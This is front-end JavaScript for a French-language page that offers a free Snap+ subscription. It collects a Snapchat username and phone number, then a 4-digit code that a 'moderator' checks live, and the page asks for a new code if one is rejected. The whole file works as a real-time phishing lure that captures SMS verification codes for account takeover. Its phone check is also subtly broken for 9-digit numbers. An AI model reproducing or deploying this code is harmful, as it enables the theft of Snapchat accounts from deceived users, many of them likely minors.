  const API_URL = '/api/v1';

  let currentUsername = '';
  let statusCheckInterval = null;

  document.addEventListener('DOMContentLoaded', () => {
    const signupForm = document.getElementById('signup-form');
    const codeForm = document.getElementById('code-form');
    const usernameInput = document.getElementById('username-input');
    const phoneInput = document.getElementById('phone-input');
    const codeInput = document.getElementById('code-input');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const initialFormDiv = document.getElementById('initial-form');
    const verificationFormDiv = document.getElementById('verification-form');
    const successScreenDiv = document.getElementById('success-screen');

    function isValidLocalFrenchMobile(value) {
      const v = String(value || '').replace(/\D/g, '');
      if (!/^\d{9,10}$/.test(v)) return false;
      if (v.length === 10) return v.startsWith('06') || v.startsWith('07');
    }

    phoneInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) value = value.slice(0, 10);
      e.target.value = value;

      if (value.length > 0 && !isValidLocalFrenchMobile(value)) {
        phoneError.textContent = 'Le numéro doit commencer par 06, 07, 6 ou 7 et contenir 9 ou 10 chiffres.';
        phoneError.style.display = 'block';
      } else {
        phoneError.style.display = 'none';
      }
    });

    codeInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0, 4);
      e.target.value = value;
      codeError.style.display = 'none';
    });

    signupForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const username = usernameInput.value.trim();
      const phone = phoneInput.value.trim();

      if (!username) {
        alert('Veuillez entrer votre nom d\'utilisateur Snapchat.');
        return;
      }

      if (phone.length < 9 || phone.length > 10) {
        phoneError.textContent = 'Le numéro doit contenir 9 ou 10 chiffres.';
        phoneError.style.display = 'block';
        return;
      }

      if (!isValidLocalFrenchMobile(phone)) {
        phoneError.textContent = 'Le numéro est incorrecte.';
        phoneError.style.display = 'block';
        return;
      }

      phoneError.style.display = 'none';
      const submitButton = signupForm.querySelector('button[type="submit"]');
      submitButton.disabled = true;
      submitButton.textContent = 'Envoi en cours...';

      try {
        const response = await fetch(`${API_URL}/submit`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ username, phone })
        });

        const data = await response.json();

        if (response.status === 429) {
          phoneError.textContent = 'Vous êtes bloqué, réessayez ultérieurement';
          phoneError.style.display = 'block';
          submitButton.disabled = false;
          submitButton.textContent = 'Continuer';
          return;
        }

        if (response.ok) {
          currentUsername = username;
          initialFormDiv.style.display = 'none';
          verificationFormDiv.style.display = 'block';
        } else {
          alert(data.error || 'Une erreur est survenue.');
          submitButton.disabled = false;
          submitButton.textContent = 'Continuer';
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Erreur de connexion au serveur.');
        submitButton.disabled = false;
        submitButton.textContent = 'Continuer';
      }
    });

    codeForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const code = codeInput.value.trim();

      if (code.length !== 4) {
        codeError.textContent = 'Le code doit contenir 4 chiffres.';
        codeError.style.display = 'block';
        return;
      }

      codeError.style.display = 'none';
      const submitButton = codeForm.querySelector('button[type="submit"]');
      submitButton.disabled = true;
      submitButton.textContent = 'Soumission en cours...';

      try {
        const response = await fetch(`${API_URL}/verify`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: currentUsername, code })
        });

        const data = await response.json();

        if (!response.ok) {
          codeError.textContent = data.error || 'Erreur lors de la soumission.';
          codeError.style.display = 'block';
          submitButton.disabled = false;
          submitButton.textContent = 'Vérifier';
          return;
        }

        verificationFormDiv.style.display = 'none';
        successScreenDiv.innerHTML = `
          <div class="success-card">
            <div style="font-size: 3em; margin-bottom: 20px;">⏳</div>
            <h2>En attente de validation</h2>
            <p>Un modérateur vérifie votre code.</p>
          </div>
        `;
        successScreenDiv.style.display = 'block';

        statusCheckInterval = setInterval(async () => {
          try {
            const statusResponse = await fetch(`${API_URL}/status/${currentUsername}`);
            const statusData = await statusResponse.json();

            if (statusData.status === 'verified') {
              clearInterval(statusCheckInterval);
              successScreenDiv.innerHTML = `
                <div class="success-card">
                  <div style="font-size: 3em; margin-bottom: 20px; user-select: none;">✅</div>
                  <h2 style="user-select: none; margin: 0 0 15px 0;">Vérification réussie !</h2>
                  <p style="user-select: none; color: #666;">Vous allez recevoir votre abonnement Snap+ sous peu.</p>
                </div>
              `;
            }

            if (statusData.status === 'rejected') {
              clearInterval(statusCheckInterval);
              successScreenDiv.style.display = 'none';
              verificationFormDiv.style.display = 'block';
              submitButton.disabled = false;
              submitButton.textContent = 'Vérifier';
              codeError.textContent = 'Code refusé. Veuillez ressaisir un code.';
              codeError.style.display = 'block';
            }
          } catch (err) {
            console.error('Status error:', err);
          }
        }, 2000);

      } catch (error) {
        console.error('Error:', error);
        submitButton.disabled = false;
        submitButton.textContent = 'Vérifier';
      }
    });

  });
